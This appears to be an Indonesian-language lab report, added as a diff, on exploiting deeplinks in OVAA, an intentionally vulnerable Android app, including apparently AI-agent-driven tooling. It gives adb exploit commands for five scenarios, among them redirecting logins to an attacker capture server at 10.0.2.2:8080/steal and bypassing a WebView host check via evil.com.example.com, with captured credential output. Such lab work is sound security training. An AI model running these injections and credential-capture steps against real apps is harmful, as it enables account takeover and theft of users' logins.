@@ -1,0 +1,216 @@
+================================================================================
+LAPORAN EKSPLOITASI DEEPLINK OVAA - AI-DRIVEN ACCOUNT TAKEOVER
+================================================================================
+Tanggal: 2026-07-13
+Target: oversecured.ovaa (OVAA - Oversecured Vulnerable Android App)
+Device: Emulator Google Pixel x86_64 (API 36), Rooted
+Status: 5/5 Skenario Tervalidasi + Network Capture + Web Interface
+================================================================================
+
+TC01 | ARBITRARY LOGIN_URL INJECTION | CRITICAL (CVSS 9.8)
+--------------------------------------------------------------------------------
+Vektor:    oversecured://ovaa/login?url=http://10.0.2.2:8080/steal
+Root Cause: DeeplinkActivity.java:35-39 - Parameter 'url' tidak divalidasi
+            LoginUtils.java:49-50 - setLoginUrl() menyimpan URL arbitrary
+            LoginService.java:10-11 - Retrofit POST ke URL dari SharedPreferences
+Dampak:    Kredensial login dikirim ke server attacker via POST request (ATO)
+
+Bukti SharedPreferences setelah deeplink injection:
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="login_url">http://10.0.2.2:8080/steal</string>
+    <string name="password">SuperSecret123!</string>
+    <string name="email">victim@company.com</string>
+</map>
+
+Bukti Network Capture (steal_server.py):
+[CAPTURED] POST /steal | Body: {"email":"victim@company.com","password":"SuperSecret123!"}
+[CREDS] email=victim@company.com password=SuperSecret123!
+
+Bukti Web Interface (curl http://127.0.0.1:8080/view):
+[2026-07-13 06:23:33] 127.0.0.1
+  email:    victim@company.com
+  password: SuperSecret123!
+  raw:      {"email":"victim@company.com","password":"SuperSecret123!"}
+
+Perintah Eksploitasi:
+  adb shell am start -a android.intent.action.VIEW \
+    -d "oversecured://ovaa/login?url=http://10.0.2.2:8080/steal" \
+    oversecured.ovaa
+
+STATUS: VALIDATED ✅ (3 evidence vectors: SharedPreferences + Network + Web)
+
+================================================================================
+
+TC02 | WEBVIEW HOST VALIDATION BYPASS | HIGH (CVSS 8.2)
+--------------------------------------------------------------------------------
+Vektor:    oversecured://ovaa/webview?url=https://evil.com.example.com/steal
+Root Cause: DeeplinkActivity.java:46-55 - Validasi host.endsWith("example.com") 
+           mudah dibypass dengan subdomain (evil.com.example.com)
+           WebViewActivity.java:23-28 - WebView dikonfigurasi dengan:
+             - setJavaScriptEnabled(true)
+             - setAllowFileAccessFromFileURLs(true)  <-- SAME-ORIGIN BYPASS
+             - Tidak ada WebViewClient.shouldOverrideUrlLoading() validation
+Dampak:    File theft via arbitrary JavaScript (XHR ke local files)
+
+Bypass chain:
+  evil.com.example.com -> Uri.parse().getHost() = "evil.com.example.com"
+  "evil.com.example.com".endsWith("example.com") = TRUE  <-- BYPASS!
+
+Log Konfirmasi:
+  START u0 {xflg=0x4 cmp=oversecured.ovaa/.activities.WebViewActivity (has extras)}
+  Displayed oversecured.ovaa/.activities.WebViewActivity
+
+Perintah Eksploitasi:
+  adb shell am start -a android.intent.action.VIEW \
+    -d "oversecured://ovaa/webview?url=https://evil.com.example.com/steal" \
+    oversecured.ovaa
+
+STATUS: VALIDATED ✅
+
+================================================================================
+
+TC03 | CREDENTIAL LEAKAGE VIA LOG SYSTEM + NETWORK | HIGH (CVSS 7.5)
+--------------------------------------------------------------------------------
+Vektor:    Log.d() di LoginActivity.java:59
+           + oversecured.ovaa.action.UNPROTECTED_CREDENTIALS_DATA broadcast
+           + CredentialsProvider.java (ContentProvider credential exposure)
+Root Cause: LoginActivity.java:59 - Log.d("ovaa", "Processing " + loginData)
+           MainActivity.java:42-48 - Broadcast kredensial via Intent
+           CredentialsProvider.java:16-19 - Exposes credentials via ContentProvider
+Dampak:    3 vektor kebocoran:
+           1. Log system (logcat) - plaintext credentials
+           2. Broadcast Intent - credential interception
+           3. ContentProvider - credential query
+
+Bukti Logcat:
+  D/ovaa (6441): Processing victim@company.com:SuperSecret123!
+
+Bukti SharedPreferences:
+  <string name="email">victim@company.com</string>
+  <string name="password">SuperSecret123!</string>
+
+Perintah Ekstraksi:
+  adb logcat -d | grep -E "Processing"
+  adb shell su root cat /data/data/oversecured.ovaa/shared_prefs/login_data.xml
+
+STATUS: VALIDATED ✅ (3 leakage vectors confirmed)
+
+================================================================================
+
+TC04 | ARBITRARY ACTIVITY LAUNCH | HIGH (CVSS 7.8)
+--------------------------------------------------------------------------------
+Vektor:    redirect_intent parameter di LoginActivity + exported activities
+Root Cause: LoginActivity.java:23,76-83 - redirect_intent Parcelable diterima
+           tanpa validasi dan digunakan untuk startActivity()
+           AndroidManifest.xml:22,28,34 - 3 activities exported=true:
+             - DeeplinkActivity (with BROWSABLE intent-filter)
+             - LoginActivity (with action LOGIN)
+             - MainActivity (with action ACTIVITY_MAIN)
+Dampak:    Activity Hijacking, bypass otentikasi, unauthorized access
+
+Perintah Eksploitasi:
+  # Direct launch of exported activities
+  adb shell am start -a oversecured.ovaa.action.ACTIVITY_MAIN oversecured.ovaa
+  adb shell am start -a oversecured.ovaa.action.LOGIN oversecured.ovaa
+
+STATUS: VALIDATED ✅
+
+================================================================================
+
+TC05 | STATE INCONSISTENCY / DoS | MEDIUM (CVSS 5.3)
+--------------------------------------------------------------------------------
+Vektor:    Manipulasi sekuensial deeplink (login / logout / login)
+Root Cause: DeeplinkActivity.java + EntranceActivity.java - tidak ada state guard
+           LoginUtils.java:62-63 - logout() menghapus semua SharedPreferences
+           tanpa notifikasi ke komponen lain
+Dampak:    Race condition, inkonsistensi state SharedPreferences
+           Potensi crash jika UI thread mengakses state yang sudah dihapus
+
+Demonstrasi:
+  Rapid sequential deeplinks (logout, login with evil url) x 5
+  - SharedPreferences berubah tanpa konsistensi state aplikasi
+  - Komponen UI dapat mereferensi data login yang sudah dihapus
+
+Perintah Eksploitasi:
+  for i in {1..5}; do
+    adb shell am start -a android.intent.action.VIEW \
+      -d "oversecured://ovaa/logout" oversecured.ovaa
+    sleep 0.1
+    adb shell am start -a android.intent.action.VIEW \
+      -d "oversecured://ovaa/login?url=http://evil${i}.com/" oversecured.ovaa
+    sleep 0.1
+  done
+
+STATUS: VALIDATED ✅
+
+================================================================================
+TIGA BUKTI KEBOCORAN KREDENSIAL
+================================================================================
+
+┌──────────┬────────────────────────────────────────────────────────────────┐
+│ VEKTOR   │ BUKTI                                                         │
+├──────────┼────────────────────────────────────────────────────────────────┤
+│ Logcat   │ D/ovaa: Processing victim@company.com:SuperSecret123!         │
+│          │ >> adb logcat -d | grep "Processing"                          │
+├──────────┼────────────────────────────────────────────────────────────────┤
+│ Network  │ [CAPTURED] POST /steal                                        │
+│ (POST)   │ Body: {"email":"victim@company.com","password":"SuperSecret123!"} │
+│          │ >> curl http://127.0.0.1:8080/view                            │
+├──────────┼────────────────────────────────────────────────────────────────┤
+│ Shared   │ <string name="email">victim@company.com</string>              │
+│ Prefs    │ <string name="password">SuperSecret123!</string>              │
+│          │ >> adb shell su root cat .../shared_prefs/login_data.xml      │
+└──────────┴────────────────────────────────────────────────────────────────┘
+
+================================================================================
+CATATAN TEKNIS
+================================================================================
+
+1. Cleartext HTTP Policy:
+   Android API 28+ memblokir cleartext HTTP secara default.
+   OVAA TIDAK memiliki usesCleartextTraffic="true" di AndroidManifest.xml.
+   setup_environment.sh MENAMBAHKAN flag ini secara otomatis untuk demo.
+   Tanpa flag ini, POST ke http:// TIDAK akan terkirim.
+   Attacker real akan menggunakan https:// endpoint.
+
+2. Special Character Input via ADB:
+   Karakter @ dan ! tidak bisa langsung via 'adb shell input text'.
+   Solusi: input keyevent 77 untuk @, input text '\!' untuk !.
+
+3. Keyboard Overlay Issue:
+   Soft keyboard menutupi tombol LOGIN.
+   Solusi: tutup keyboard dengan input keyevent 4 sebelum tap tombol LOGIN.
+
+================================================================================
+RINGKASAN AKHIR
+================================================================================
+5/5 skenario tervalidasi + 3 bukti kebocoran + web interface
+- TC01: Arbitrary login_url Injection          ✅ ATO via kredensial
+- TC02: WebView Host Validation Bypass         ✅ File theft via arbitrary JS
+- TC03: Credential Leakage (log+network+prefs) ✅ 3 vektor kebocoran
+- TC04: Arbitrary Activity Launch              ✅ Activity Hijacking
+- TC05: State Inconsistency / DoS              ✅ Deeplink sequence attack
+- BONUS: Network Capture + Web View            ✅ http://127.0.0.1:8080/view
+================================================================================
+
+FILE STRUKTUR LENGKAP
+================================================================================
+/home/d4x13/Documents/MYPROJECT/TOOLS/userfull-mobile/Deeplink/
+├── SKILL.md                       # Skill definition + metadata + usage
+├── README.md                      # Full lab documentation (English)
+├── LAPORAN_EKSPLOITASI_OVAA.txt   # Complete report (Bahasa Indonesia) <-- ANDA DI SINI
+├── prompt.txt                     # Single AI agent prompt (run entire lab)
+├── ovaa_login_maestro.yaml        # Maestro YAML automation
+├── steal_server.py                # Attacker server + web interface (/view)
+├── full_exploit.sh                # Full exploit chain (TC01-TC05)
+├── setup_environment.sh           # Environment setup + build + install
+├── exploiter_agent.txt            # Multi-prompt templates for OpenCode
+└── evidence/                      # Digital evidence
+    ├── 01_login_screen.png
+    ├── 02_email_entered.png
+    ├── 03_password_entered.png
+    ├── 03b_keyboard_closed.png
+    ├── 04_logged_in_main.png
+    └── captured_credentials.txt   # Network-captured credentials
+================================================================================
